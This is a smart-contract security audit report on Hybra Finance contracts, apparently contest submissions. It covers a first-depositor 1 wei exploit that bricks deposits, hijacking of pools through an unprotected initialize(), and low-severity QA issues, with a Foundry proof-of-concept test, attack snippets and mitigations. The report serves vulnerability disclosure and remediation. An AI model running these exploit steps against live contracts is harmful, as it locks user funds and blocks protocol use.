# H1 - First-Depositor 1 wei HYBR Frontrun: Permanent Zero-Share Mint (gHYBR) and Protocol Deposit DoS

**Severity:** High (Valid) 
**Affected Contract:** `GovernanceHYBR.sol`  
**Affected Function:** `deposit(uint256 amount, address recipient)`

---

## Description

An attacker can permanently break the deposit mechanism by becoming the **first depositor** and depositing exactly **1 wei of HYBR**. Due to integer truncation, order-of-operations, and the allowance of zero-share mints, **all subsequent deposits mint 0 gHYBR**, while still transferring and locking user funds.

This results in a **permanent denial-of-service (DoS)** on deposits and total loss of usability for governance participation.

Because deposits do not revert when zero shares are minted, users silently donate HYBR to the protocol and receive **no entitlement**.

---

## High-Level Attack Summary

1. Attacker frontruns deployment and deposits **1 wei HYBR**.
2. The protocol initializes the veNFT with this minimal amount.
3. `totalSupply()` becomes `1`, while `totalAssets()` increases monotonically.
4. All future deposits compute shares using integer division and **round down to zero**.
5. Zero-share mints succeed, permanently locking user funds.

The protocol never recovers without manual administrative intervention or redeployment.

---

## Root Cause Analysis (Function-by-Function)

### Step 1 — First Deposit (Attacker)

The attacker calls:

```solidity
GovernanceHYBR.deposit(1, attacker);
```

Since `veTokenId == 0`, the initialization path executes:

```solidity
_initializeVeNFT(amount);
```

```solidity
function _initializeVeNFT(uint256 initialAmount) internal {
    IERC20(HYBR).approve(votingEscrow, type(uint256).max);
    uint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;
    veTokenId = IVotingEscrow(votingEscrow)
        .create_lock_for(initialAmount, lockTime, address(this));
}
```

This locks **1 wei HYBR** into the voting escrow.

---

### Step 2 — Escrow State Update

Inside the voting escrow:

```solidity
locked[veTokenId].amount = 1;
```

As a result:

```solidity
totalAssets() == 1;
totalSupply() == 1;
```

---

### Step 3 — Subsequent Deposits (Victims)

A victim deposits a large amount, e.g. `10 HYBR`.

Because `veTokenId != 0`, the `else` branch executes **before share calculation**:

```solidity
IERC20(HYBR).approve(votingEscrow, amount);
IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);
_extendLockToMax();
```

This **updates `totalAssets()` before shares are computed**.

---

### Step 4 — Share Calculation Failure

Share formula:

```text
shares = amount * totalSupply / totalAssets
```

Substituting values:

```text
shares = 10 * 1 / (1 + 10) = 0.909 → 0
```

Due to integer truncation, **zero shares are minted**.

---

### Step 5 — Silent Zero-Share Mint

OpenZeppelin ERC20 allows zero-amount mints:

```solidity
_mint(recipient, 0); // succeeds
```

No revert occurs. Funds are locked forever, and the user receives **0 gHYBR**.

---

## Permanent Lock Condition

- `totalSupply` remains `1`
- `totalAssets` continues increasing
- `amount * totalSupply / totalAssets` always rounds to `0`

**All future deposits are permanently bricked.**

---

## Impact

| Impact Area | Description |
|------------|-------------|
| Exploitability | Single frontrunning deposit of 1 wei HYBR |
| Loss Type | Permanent protocol DoS |
| Technical Risk | Integer truncation + incorrect accounting order |
| User Impact | All future deposits mint 0 shares indefinitely |
| Recovery | Requires admin intervention or redeployment |

A single malicious or accidental transaction irreversibly breaks staking and governance participation.

---

## Recommended Mitigations

### 1. Compute Shares Using Pre-Deposit Snapshot (Primary Fix)

```solidity
uint256 shares = calculateShares(amount); // BEFORE modifying totalAssets
require(shares > 0, "Zero-share mint");

IERC20(HYBR).safeTransferFrom(msg.sender, address(this), amount);

if (veTokenId == 0) {
    _initializeVeNFT(amount);
} else {
    IERC20(HYBR).approve(votingEscrow, amount);
    IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);
    _extendLockToMax();
}

_mint(recipient, shares);
_addTransferLock(recipient, shares);
```

---

### 2. Explicitly Revert on Zero Shares

```solidity
require(shares > 0, "Zero shares");
```

This prevents silent donation of funds.

---

### 3. Enforce Minimum Initial Deposit

```solidity
uint256 public constant MIN_INITIAL_DEPOSIT = 1e18; // example
```

Prevents trivial 1 wei attacks entirely.

---

### 4. Alternative Design

Compute shares using:

```text
A₀ = totalAssets() BEFORE deposit
```

Never against post-deposit state.

---

## Proof of Concept

The following Foundry test demonstrates the exploit end-to-end.

> Remove the existing PoC code from `v33/test/C4PoC.t.sol` and replace it with the following.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {C4PoCTestbed} from "./C4PoCTestbed.t.sol";

contract C4PoC is C4PoCTestbed {
    address public attacker = address(0xAA);
    address[] public victim;

    function setUp() public override {
        super.setUp();
        uint256 attackerFund = 10 ether;
        vm.prank(deployer);
        hybr.transfer(attacker, attackerFund);

        for (uint i; i < 5; i++) {
            address v = address(uint160(uint(0xA1 + i)));
            victim.push(v);
            vm.prank(deployer);
            hybr.transfer(v, 1000 ether);
        }
    }

    function test_submissionValidity() external {
        vm.startPrank(attacker);
        hybr.approve(address(gHybr), 1);
        gHybr.deposit(1, attacker);
        vm.stopPrank();

        assertEq(gHybr.totalSupply(), 1);

        uint256 victimAmount = 500 ether;
        for (uint i; i < victim.length; i++) {
            vm.startPrank(victim[i]);
            hybr.approve(address(gHybr), victimAmount);
            gHybr.deposit(victimAmount, victim[i]);
            assertEq(gHybr.balanceOf(victim[i]), 0);
            vm.stopPrank();
        }
    }
}
```

---

## How to Run

```bash
forge test --match-test test_submissionValidity -vvv
```

---

## Expected Result

All victim deposits succeed but mint **0 gHYBR**, permanently locking funds and confirming the exploit.




# S2 - Pre-initialization & Pre-cloning of CL Pools Allowing Denial of Legitimate Pool Creation

---

##  Summary

A critical design flaw in the **CLFactory** and **CLPool** contracts allows any external actor to **preemptively deploy and initialize canonical concentrated liquidity pools**. This enables **permanent denial-of-service** for legitimate pool creation and allows **economic manipulation** via malicious initialization parameters.

---

## 🧩 Affected Components

### Contracts
- `CLFactory.sol`
- `CLPool.sol`

### Functions
- `CLFactory.createPool(...)`
- `CLPool.initialize(...)`

---

##  Vulnerability Description

The system allows **unauthorized pool initialization** due to:
- **Public, unrestricted `initialize()`**
- **Deterministic clone addresses**
- **Single canonical pool per (token0, token1, tickSpacing)**

### Factory Pool Creation (excerpt)

```solidity
function createPool(
    address tokenA,
    address tokenB,
    int24 tickSpacing,
    uint160 sqrtPriceX96
) external override returns (address pool) {
    require(tokenA != tokenB);
    (address token0, address token1) =
        tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    require(token0 != address(0));
    require(tickSpacingToFee[tickSpacing] != 0);
    require(getPool[token0][token1][tickSpacing] == address(0));

    pool = Clones.cloneDeterministic({
        master: poolImplementation,
        ...
    });
}
```

### Pool Initialization (excerpt)

```solidity
function initialize(
    address _factory,
    address _token0,
    address _token1,
    int24 _tickSpacing,
    address _gaugeManager,
    uint160 _sqrtPriceX96
) external override {
    require(factory == address(0) && _factory != address(0));
    factory = _factory;
    token0 = _token0;
    token1 = _token1;
    tickSpacing = _tickSpacing;
}
```

❗ **No access control** exists — any external caller may initialize the pool.

---

## Attack Capabilities

An attacker can:

1. **Precompute** the deterministic pool address.
2. **Deploy** the pool clone before legitimate users.
3. **Initialize** it with:
   - Arbitrary `_sqrtPriceX96`
   - Malicious gauge manager
4. **Occupy** the canonical slot in `getPool[token0][token1][tickSpacing]`.
5. **Block** all future legitimate pool creation for that pair.

---

##  Root Causes

### Public Initialization
- No `msg.sender == factory` restriction.
- Once initialized, the pool becomes immutable.

### Deterministic Clone Addresses
- Salt: `keccak256(token0, token1, tickSpacing)`
- Addresses are **fully predictable**.

### Arbitrary Price Initialization
- `_sqrtPriceX96` directly controls tick.
- Extreme values break LP bootstrapping.

### Single Canonical Pool Slot
- Only one pool per `(token0, token1, tickSpacing)`.
- Pre-initialization permanently blocks the slot.

---

## Step-by-Step Attack Path

**Scenario:** Block pool for `(tokenA, tokenB)` at `tickSpacing = 50`.

1. Precompute address:
```solidity
bytes32 salt = keccak256(abi.encode(tokenA, tokenB, 50));
address predictedPool =
    Clones.predictDeterministicAddress(poolImplementation, salt, factory);
```

2. Deploy clone:
```solidity
Clones.cloneDeterministic(poolImplementation, salt);
```

3. Initialize maliciously:
```solidity
CLPool(clone).initialize(
    factory,
    tokenA,
    tokenB,
    50,
    attackerGauge,
    attackerSqrtPriceX96
);
```

4. Legitimate `createPool()` now **reverts permanently**.

---

## Concrete Economic Impact

- Attacker initializes pool at:
  - `1 tokenA ≈ 1,000,000 tokenB`
- Liquidity providers require **unrealistic capital**
- Result:
  - Pool bootstrapping fails
  - Swaps revert or are uneconomical
  - Early liquidity is effectively blocked

---

## Impact Assessment

| Severity | Impact |
|-------|-------|
| High | Permanent DoS on canonical pool creation |
| High | Price manipulation & arbitrage |
| Medium | Corrupted downstream protocol state |
| Medium | Manual admin intervention required |

---

## Recommended Mitigations

### Restrict Initialization to Factory

```solidity
function initialize(...) external override {
    require(factory == address(0) && _factory != address(0));
    require(msg.sender == _factory, "Only factory may initialize pool");
    ...
}
```

###  Optional: Restrict Pool Creation

```solidity
function createPool(...) external onlyOwner returns (address pool) {
    ...
}
```

### Sanity Checks on Initial Price
- Bound `_sqrtPriceX96` to reasonable ranges.
- Reference oracle or TWAP.

### Consider Multiple Pools per Tick
- Prevents permanent slot monopolization.

---

## Proof of Concept

**Location:** `cl/test/C4PoC.t.sol`

1. Remove existing contents.
2. Paste provided PoC code.
3. Run:

```bash
forge test --mt test_preclone_block_and_economicImpact -vvv
```

 Demonstrates:
- Pool slot hijacking
- Failed legitimate creation
- Extreme liquidity skew

---

## Conclusion

This is a **high-severity architectural vulnerability** enabling:
- Permanent denial-of-service
- Economic poisoning
- Canonical pool hijacking

Immediate remediation is strongly recommended **before mainnet deployment**.


#  QA Report (Valid)

## L-01 — Withdraw / multiSplit Zero-Amount Edge Cases
**Severity:** Low  
**Affected Contract:** GovernanceHYBR.sol (GrowthHYBR)  
**Affected Function:** `withdraw(uint256 shares)` → calls `IVotingEscrow.multiSplit(veTokenId, amounts)`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L161

### Description
When `withdraw()` is called with very small `shares`, `calculateAssets(shares)` can produce `hybrAmount` and `feeAmount` that round down to zero. The `amounts` array passed to `multiSplit` may therefore contain zero values, which can cause `multiSplit` to revert.

```solidity
uint256 hybrAmount = calculateAssets(shares);
require(hybrAmount > 0, "No assets to withdraw");

uint256 feeAmount = 0;
if (withdrawFee > 0) {
    feeAmount = (hybrAmount * withdrawFee) / BASIS;
}

uint256 userAmount = hybrAmount - feeAmount;
require(userAmount > 0, "Amount too small after fee");

uint256 remainingAmount = veBalance - userAmount - feeAmount;

uint256[] memory amounts = new uint256[](3);
amounts[0] = remainingAmount;
amounts[1] = userAmount;
amounts[2] = feeAmount;

IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);
```

### Attack / Failure Path
- Tiny-share users or low-TVL pools may encounter reverts on legitimate withdrawals.
- Funds may become temporarily or permanently stuck until operator intervention or TVL growth.

### Impact
- User-facing withdrawal failures and degraded UX.
- Potential for targeted manipulation to induce zero-split conditions.
- Small withdrawals may be locked until sufficient accumulation.

### Recommended Mitigations
- Avoid calling `multiSplit` with zero-value entries; dynamically exclude zero amounts.
- Enforce a minimum withdrawable HYBR or share amount.
- Accumulate dust internally and process withdrawals once above a safe threshold.
- Clearly document minimum withdrawal constraints in UI and protocol docs.


## L-02 — CLPool.observe Unbounded Iteration / Gas DoS Risk
**Severity:** Low  
**Affected Contract:** CLPool.sol  
**Affected Function:** `observe(uint32[] calldata secondsAgos)`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/cl/contracts/core/CLPool.sol#L289

### Description
The function forwards a user-supplied `secondsAgos` array to `observations.observe(...)` without enforcing an upper bound. Gas usage scales linearly with array length, allowing calls that may exceed the block gas limit.

```solidity
return observations.observe(
    _blockTimestamp(), secondsAgos, slot0.tick,
    slot0.observationIndex, liquidity, slot0.observationCardinality
);
```

### Attack / Failure Path
- External calls with very large `secondsAgos` arrays can revert due to gas exhaustion.
- Can disrupt swaps, governance operations, treasury actions, or integrations relying on `observe`.

### Impact
- **Fund Safety:** None.
- **Availability:** On-chain calls may fail.
- **UX / Integrations:** Frontends and composable protocols may experience unexpected reverts.

### Recommended Mitigations
- Enforce input bounds: `require(secondsAgos.length <= MAX_OBSERVE_SAMPLES)`.
- Provide batch or paginated observation APIs.
- Clearly document safe array sizes and gas implications.
- Encourage `staticcall` usage where applicable.


## L-03 — compound() and receivePenaltyReward() Mix Protocol and User Balances
**Severity:** Low  
**Affected Contract:** GovernanceHYBR.sol (GrowthHYBR)  
**Affected Functions:** `compound()`, `receivePenaltyReward(uint256 amount)`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L446

### Description
Both functions deposit all HYBR held by the contract into the same veNFT without distinguishing between protocol-owned funds (penalties, rewards) and user deposits.

```solidity
uint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));
IVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);
```

### Impact
- Incorrect share accounting and reward misallocation.
- Gradual governance and economic drift as proportionality assumptions erode.

### Recommended Mitigations
- Maintain separate accounting for protocol-owned balances and user deposits.
- Sweep and lock protocol rewards independently.
- Ensure transaction ordering does not affect user entitlements.
- Emit detailed events for accounting transparency.


## L-04 — Missing Zero-Address Checks in Core Token Logic
**Severity:** Low  
**Affected Contract:** HYBR.sol  
**Affected Functions:** `_mint`, `_transfer`, `_burn`, `transfer`, `transferFrom`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/HYBR.sol#L46

### Description
Token operations allow minting, transferring, or burning involving `address(0)` without explicit checks, potentially inflating `balanceOf(address(0))` or breaking supply invariants.

### Impact
- Accounting inconsistencies.
- Low direct financial risk, but potential integration and analytics issues.

### Recommended Mitigations
- Add standard zero-address checks in all token operations.
- Align mint and burn semantics with ERC-20 expectations.


## L-05 — Unchecked Epoch Loop in VotingEscrow _checkpoint
**Severity:** Low  
**Affected Contract:** VotingEscrow.sol  
**Affected Function:** `_checkpoint`, `checkpoint`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/VotingEscrow.sol#L625

### Description
The weekly loop inside `_checkpoint` may iterate up to 255 times with storage writes. Large numbers of scheduled slope changes can make this function gas-intensive.

### Impact
- Potential DoS for checkpoint-dependent operations.
- Increased operational cost and degraded UX.

### Recommended Mitigations
- Bound iterations per call and persist a cursor.
- Add gas-awareness using `gasleft()`.
- Enforce minimum deposits for far-future slope changes.


## C-01 — Initial Mint Amount Mismatch (Comment vs On-Chain)
**Affected Contract:** HYBR.sol  
**Affected Function:** `initialMint`  
**Link:** https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/HYBR.sol#L33C2-L38C6

### Description
The inline comment states an initial mint of **50M HYBR**, while the code mints **500M HYBR**.

```solidity
// Initial mint: total 50M
_mint(_recipient, 500 * 1e6 * 1e18);
```

### Impact
- Tokenomics and governance expectation mismatch.
- No immediate exploit, but correctness and trust risk.

### Recommended Mitigations
- Replace magic numbers with named constants.
- Perform pre-deployment supply verification and multi-party review.

